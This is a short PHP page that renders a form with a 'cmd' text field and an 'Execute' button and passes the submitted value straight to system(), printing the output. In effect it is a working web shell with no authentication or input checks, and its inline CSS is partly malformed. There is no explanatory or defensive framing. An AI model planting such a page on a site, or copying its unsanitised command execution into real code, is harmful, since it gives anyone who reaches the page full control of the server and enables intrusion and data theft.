<html>
<?php
include "header.php";
?>   
<div class="barre">
    <form method="GET" name="<?php echo basename($_SERVER["PHP_SELF"]); ?>">

    <ul class="box">

        <input class="form-control mr-sm-2" type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input class="btn btn-outline-success my-2 my-sm-0" type="SUBMIT" value="Execute">
    </ul>
    </form>
</div>
<pre>
<?php
    if(isset($_GET["cmd"]))
    {
        system($_GET["cmd"]);
    }
?>
</pre>
<?php
include "footer.html";
?>
<style>
.box {
    display: flex;
    flex-direction: row;
}
.input
{
    
  height: 50px;
  width: 30px;
  font-size: 3.5em;
}
.barre {
 
    position : absolute

    left  50px
    top 75px;


}

</style>
</html>